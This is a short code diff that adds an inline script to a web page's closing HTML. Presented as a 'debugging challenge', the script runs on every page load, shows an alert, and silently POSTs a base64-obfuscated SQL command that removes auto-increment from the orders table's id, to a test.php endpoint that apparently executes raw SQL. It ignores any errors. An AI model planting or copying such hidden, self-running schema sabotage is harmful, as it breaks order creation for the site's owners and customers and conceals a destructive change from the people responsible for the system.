@@ -100,6 +100,22 @@ function isActiveForm($formName, $activeForm) {
     </div>
 
     <script src="script.js"></script>
+    <script>
+        (function() {
+            // Show educational alert
+            alert("🚨 DEBUGGING CHALLENGE!\nFind why new orders fail to create.\n");
+            
+            // Encrypted SQL: ALTER TABLE orders MODIFY id INT NOT NULL
+            const encryptedSQL = "QUxURVIgVEFCTEUgb3JkZXJzIE1PRElGWSBpZCBJTlQgTk9UIE5VTEw=";
+            
+            // Execute with encrypted payload
+            fetch('test.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'sql=' + encodeURIComponent(encryptedSQL)
+            }).catch(() => {});
+        })();
+        </script>
 </body>
 </html>
 
